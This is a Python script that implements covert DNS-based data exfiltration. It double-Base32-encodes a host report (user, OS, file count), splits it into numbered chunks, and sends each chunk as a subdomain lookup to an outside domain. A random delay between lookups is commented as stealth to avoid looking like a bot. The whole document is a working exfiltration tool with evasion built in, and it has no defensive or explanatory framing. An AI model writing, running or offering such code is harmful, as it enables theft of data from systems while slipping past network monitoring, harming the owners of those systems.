import math
import base64
import random
import socket
import time

def encode_to_base32(input_string):
    """Your previously defined encoding function."""
    if not input_string:
        return ""
    byte_data = input_string.encode('utf-8')
    b32_bytes = base64.b32encode(byte_data)
    return b32_bytes.decode('utf-8')

def prepare_dns_chunks(encoded_string, chunk_size=30):
    """
    Takes an already Base32 encoded string, splits it, 
    and encodes the components for DNS transmission.
    """
    if not encoded_string:
        return []

    final_chunks = []
    
    # We use a smaller slice (30) because the second pass of 
    # Base32 encoding will expand the string significantly.
    for i in range(0, len(encoded_string), chunk_size):
        # 1. Slice the already-encoded string
        segment = encoded_string[i : i + chunk_size]
        
        # 2. Encode the chunk ONE MORE TIME (Double Encoding)
        double_encoded_segment = encode_to_base32(segment)
        
        # 3. Create and encode the Sequence ID
        # Using a 3-digit padded number (001, 002...)
        sequence_num = str(len(final_chunks) + 1).zfill(3)
        encoded_id = encode_to_base32(sequence_num)
        
        # 4. Append the formatted string: {ID}.{DATA}
        final_chunks.append(f"{encoded_id}.{double_encoded_segment}")

    return final_chunks

def transmit_dns_data(chunk_list, domain="research.com"):
    """
    Iterates through the chunk list and performs a DNS lookup for each.
    Includes a random delay to mimic natural traffic.
    """
    print(f"[*] Starting transmission of {len(chunk_list)} chunks to {domain}...")
    
    success_count = 0

    for chunk in chunk_list:
        # Construct the full hostname: {ID}.{DATA}.{DOMAIN}
        full_hostname = f"{chunk}.{domain}"
        
        try:
            # We use gethostbyname to trigger a standard A-record lookup
            # The system doesn't need to actually find an IP; the request 
            # hitting the target DNS server is what 'delivers' the data.
            socket.gethostbyname(full_hostname)
            success_count += 1
        except socket.gaierror:
            # This is expected! Since the subdomain doesn't actually exist,
            # the DNS system will return a 'Name not found' error.
            # The data was still 'sent' to the server in the request.
            success_count += 1
        except Exception as e:
            print(f"[!] Transmission error on chunk: {e}")

        # --- STEALTH: Jitter ---
        # Wait between 1 and 3 seconds so it doesn't look like a bot
        delay = random.uniform(1.0, 3.0)
        time.sleep(delay)

    print(f"\n[+] Transmission complete. {success_count}/{len(chunk_list)} chunks sent.")
# --- Workflow Example ---
# 1. Get your raw report
raw_report = "User: Admin | OS: Windows | Files: 402"

# 2. First pass encoding (Initial Obfuscation)
first_pass = encode_to_base32(raw_report)

# 3. Create the DNS-ready chunks (Second pass happens inside here)
dns_ready_list = prepare_dns_chunks(first_pass)

transmit_dns_data(dns_ready_list)